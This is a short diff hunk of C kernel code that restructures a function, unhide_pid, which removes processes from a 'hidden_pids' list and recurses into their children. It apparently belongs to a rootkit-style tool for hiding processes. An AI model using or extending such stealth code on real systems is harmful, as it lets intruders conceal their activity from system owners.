@@ -81,14 +81,13 @@ unhide_pid(pid_t pid)
     if (node == &hidden_pids)
         return;
 
-    if (!(spid = find_get_pid(pid)) || !(task = pid_task(spid, PIDTYPE_PID)))
-        return;
+    if ((spid = find_get_pid(pid)) && (task = pid_task(spid, PIDTYPE_PID))) {
+        struct list_head *i;
+        list_for_each(i, &task->children) {
+            struct task_struct *child = list_entry(i, struct task_struct, sibling);
 
-    struct list_head *i;
-    list_for_each(i, &task->children) {
-        struct task_struct *child = list_entry(i, struct task_struct, sibling);
-
-        unhide_pid(child->pid);
+            unhide_pid(child->pid);
+        }
     }
 
     remove_pid_from_list(node, pid);
